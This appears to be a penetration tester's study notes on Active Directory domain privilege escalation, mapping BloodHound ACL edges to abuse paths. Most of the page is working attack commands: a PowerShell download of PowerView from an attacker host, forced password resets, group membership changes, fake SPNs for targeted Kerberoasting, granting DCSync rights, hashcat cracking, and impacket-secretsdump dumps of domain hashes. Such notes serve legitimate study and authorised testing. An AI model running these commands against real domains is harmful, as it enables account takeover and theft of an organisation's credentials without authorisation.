# Domain Privilege Escalation

Domain privilege escalation = abusing Active Directory permissions / relationships to gain more control in the domain.

```text
local Windows privesc -> admin/SYSTEM on one host  
domain privesc -> more rights over AD users/groups/computers/domain objects
```

AD Privilege Escalation Flow
1. Find interesting BloodHound edge / ACL  
2. Identify controlled principal  
3. Identify target object  
4. Understand what the right allows  
5. Validate manually  
6. Pick least destructive abuse path  
7. Test carefully  
8. Record evidence


| BloodHound Edge / Finding  | What It Means                     | Relevant Abuse                     |
| -------------------------- | --------------------------------- | ---------------------------------- |
| `GenericAll` over user     | Full control over user            | Reset password / set SPN           |
| `GenericAll` over group    | Full control over group           | Add member                         |
| `GenericAll` over computer | Full control over computer object | RBCD / computer takeover path      |
| `GenericWrite` over user   | Write user attributes             | Targeted Kerberoast / shadow creds |
| `WriteDacl`                | Modify ACL                        | Grant yourself rights              |
| `WriteOwner`               | Change owner                      | Take ownership then modify ACL     |
| `Owns`                     | Own target object                 | Modify ACL                         |
| `AddMember`                | Add member to group               | Add controlled user                |
| `AddSelf`                  | Add yourself to group             | Add current user                   |
| `ForceChangePassword`      | Reset target password             | Account takeover                   |
| `AllExtendedRights`        | Extended rights                   | Password reset depending on object |
| `ReadLAPSPassword`         | Read LAPS password                | Local admin on target host         |
| `ReadGMSAPassword`         | Read gMSA secret                  | Use service account                |
| `DCSync`                   | Replicate domain secrets          | Dump domain hashes                 |
| `GenericAll` over GPO      | Full control over GPO             | GPO abuse                          |
| `WriteDacl` over GPO       | Modify GPO ACL                    | Take control of GPO                |
| `WriteOwner` over GPO      | Own GPO                           | Take control of GPO                |


`GenericAll` =  full control over the target AD object.

|Target Object|Possible Abuse|
|---|---|
|User|Reset password, set SPN, shadow credentials|
|Group|Add member|
|Computer|RBCD, local admin path, modify attributes|
|GPO|Modify GPO and affect linked systems|
|Domain|Potential high-impact rights depending on ACL|

e.g. `GenericAll` Over User : alice has `GenericAll` over bob

Attack Vectors: 
- reset `bob`'s password
- set SPN on `bob` for targeted Kerberoast
- modify attributes
- potentially add key credentials / shadow creds depending on tooling and environment

Bloodhound output: 
```
The user ALICE@DOMAIN.domain has GenericAll permissions to the user BOB@DOMAIN.domain.

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.
```

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```cmd
powershell -ep bypass
```

```powershell
iwr -uri http://attacker_ip/enum/PowerView.ps1 -outfile PowerView.ps1

Import-Module .\PowerView.ps1  
```

```powershell
# Create a new password object
$SecPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

# Reset target password
Set-DomainUserPassword -Identity bob -AccountPassword $SecPassword
```

```bash
# Test the new credential
└─$ netexec smb target_ip -u bob -p 'new_password' -d domain.local
└─$ evil-winrm -i target_ip -u bob -p 'new_password'
```


e.g. Abuse Using Explicit Credentials
- use when operating as a different user passing domain creds and exploiting `genericall` of another user 

```powershell
# Create credential object
$SecPassword = ConvertTo-SecureString 'alice_password' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('domain.local\alice', $SecPassword)

# Create new target password
$UserPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

# Reset bob's password using alice creds
Set-DomainUserPassword -Identity bob -AccountPassword $UserPassword -Credential $Cred
```

e.g. If `alice` has `GenericAll` over a group -> add users to group
```powershell
# Add bob to target group
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'bob'

# With explicit credentials
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'bob' -Credential $Cred

# Verify
Get-DomainGroupMember -Identity 'GROUP_NAME'
```

```cmd
net group "GROUP_NAME" /domain

:: check else if needed log in again using the modified account.
whoami /groups
```


`GenericWrite` = can modify selected attributes on the target object.
- If `alice` has `GenericWrite` over `target_user` -> add an SPN to `target_user`.

1. `GenericWrite` over user  -> can modify target user attributes  
2. Set fake SPN on target user  -> makes target account Kerberoastable  
3. Request TGS for fake SPN  -> obtain crackable Kerberos ticket  
4. Crack TGS offline  -> test password candidates locally  
5. If cracked  -> recover target user's plaintext password  -> use creds for lateral movement / privesc

|Target|Possible Abuse|
|---|---|
|User|Set SPN for targeted Kerberoast, modify logon script, shadow credentials|
|Group|May modify some group attributes|
|Computer|RBCD / attribute abuse depending on rights|
|GPO|Possible GPO manipulation depending on permissions|

```
Targeted Kerberoast attack
A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket.
```

Refer to [kerberos attacks](./kerberos-attacks.md) for detailed notes

Set SPN for Targeted Kerberoast using `alice` has `GenericWrite` over `target_user`
```powershell
# Validate GenericWrite using PowerView
Get-ObjectAcl -Identity target_user -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "GenericWrite"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectDN

# Confirm the controlled SID resolves to your user or group
Convert-SidToName S-1-5-21-1111111111-2222222222-3333333333-1105

# Create credential object
$SecPassword = ConvertTo-SecureString 'alice_password' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('domain.local\alice', $SecPassword)

# Set fake SPN on target user
Set-DomainObject -Credential $Cred -Identity target_user -Set @{serviceprincipalname='nonexistent/service'}

# Request SPN ticket
Get-DomainSPNTicket -Credential $Cred target_user | fl

# e.g. output
$krb5tgs$23$*target_user$DOMAIN.LOCAL$nonexistent/service*$REDACTED_HASH
```

crack on kali using [hashcat or john](../../03-tools/hashcat.md)
```bash
└─$ sudo hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force 
```

`ForceChangePassword` = current user can reset the target user’s password.

```powershell
Get-ObjectAcl -Identity target_user -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,ObjectDN

# abuse
$UserPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

Set-DomainUserPassword -Identity target_user -AccountPassword $UserPassword

# with explicit creds
Set-DomainUserPassword -Identity target_user -AccountPassword $UserPassword -Credential $Cred
```


`AddMember` = can add a principal to a group.
`AddSelf` = can add your own user to a group.

```powershell
Get-ObjectAcl -Identity 'GROUP_NAME' -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|AllExtendedRights"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectDN
# alice -> AddMember -> GROUP_NAME

Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'alice'
Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'alice' -Credential $Cred
Get-DomainGroupMember -Identity 'GROUP_NAME'
```

```cmd
:: validate group membership
whoami /groups
```


`WriteDacl` = can modify the target object’s ACL.
- grant yourself `GenericAll`
- grant DCSync rights on domain object
- grant rights to controlled user

```powershell
# validate with powerview
Get-ObjectAcl -Identity target_object -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectDN

# Abuse: Grant GenericAll
Add-DomainObjectAcl -TargetIdentity target_object -PrincipalIdentity alice -Rights All

# validate with powerview
Get-ObjectAcl -Identity target_object -ResolveGUIDs |
Where-Object {$_.IdentityReference -match "alice"}
```

`DCSync` = if target is Domain Object

```powershell
# Abuse: Grant DCSync Rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity alice -Rights DCSync
```

```bash
└─$ impacket-secretsdump domain.local/alice:'alice_password'@dc01.domain.local -just-dc
```

`WriteOwner` = can change the owner of the target object.
- `WriteOwner` -> take ownership -> grant rights -> abuse object
```powershell
Get-ObjectAcl -Identity target_object -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "WriteOwner"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectDN

Set-DomainObjectOwner -Identity target_object -OwnerIdentity alice
Add-DomainObjectAcl -TargetIdentity target_object -PrincipalIdentity alice -Rights All
```

attack vector afterwards depends on target object 
```text
user -> reset password / set SPN  
group -> add member  
domain -> possible DCSync path
```

`AllExtendedRights` = extended permissions such as password reset depending on the target object.

```powershell
Get-ObjectAcl -Identity target_user -ResolveGUIDs |
Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight|AllExtendedRights"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,ObjectDN

$UserPassword = ConvertTo-SecureString 'new_password' -AsPlainText -Force

Set-DomainUserPassword -Identity target_user -AccountPassword $UserPassword
```

`ReadLAPSPassword` = can read the LAPS-managed local administrator password for a computer.
- local admin password → local admin access to target host

```powershell
# powerview
Get-DomainComputer -Identity workstation01 -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

# ldap
LDAPSearch -LDAPQuery "(&(objectCategory=computer)(cn=WORKSTATION01))"

# in results look for ms-mcs-admpwd
```

if pw found
```bash
evil-winrm -i target_ip -u local_admin -p 'local_admin_password'

netexec smb target_ip -u local_admin -p 'local_admin_password' --local-auth
```

`ReadGMSAPassword` = can read gMSA password material.
- gMSA account may run services or have delegated access


`DCSync` = a principal has replication rights that allow it to ask a DC for credential material.

required rights: 
```text
DS-Replication-Get-Changes  
DS-Replication-Get-Changes-All  
DS-Replication-Get-Changes-In-Filtered-Set
```

bloodhound may show
```text
DCSync  
GetChanges  
GetChangesAll
```

```powershell
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs |
Where-Object {$_.ObjectAceType -match "Replication-Get"} |
Select-Object SecurityIdentifier,ActiveDirectoryRights,ObjectAceType
```

```bash
impacket-secretsdump domain.local/alice:'alice_password'@dc01.domain.local -just-dc

impacket-secretsdump -hashes :ntlm_hash domain.local/alice@dc01.domain.local -just-dc

impacket-secretsdump domain.local/alice:'alice_password'@dc01.domain.local -just-dc-user target_user
```


GPO control 
```text
GenericAll over GPO  
GenericWrite over GPO  
WriteDacl over GPO  
WriteOwner over GPO  
GpLink  
Contains
```
